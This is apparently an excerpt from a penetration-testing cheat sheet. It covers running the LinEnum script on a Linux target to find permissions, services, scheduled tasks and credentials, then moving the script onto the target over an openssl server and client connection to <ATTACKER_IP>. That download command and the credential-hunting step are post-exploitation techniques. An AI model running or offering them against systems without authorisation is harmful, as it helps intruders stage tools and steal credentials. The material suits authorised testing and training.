## Run a basic Linux enumeration report

**Run in:** Linux target. **Requires:** The intended LinEnum script already available locally and Bash support; optional deeper scans have different scope/cost.

```bash
bash ./LinEnum.sh
```

**What the result establishes:** Use the report to shortlist local permissions, services, scheduled tasks and credentials worth checking manually.

**Next check:** Use a direct query for the missing evidence, then verify permissions and the privileged process that would consume the candidate object.

### Linux LOLBins

**File Transfers for Linux and Windows**

```bash
# On attacker — create cert and start server
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# On target — download
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```
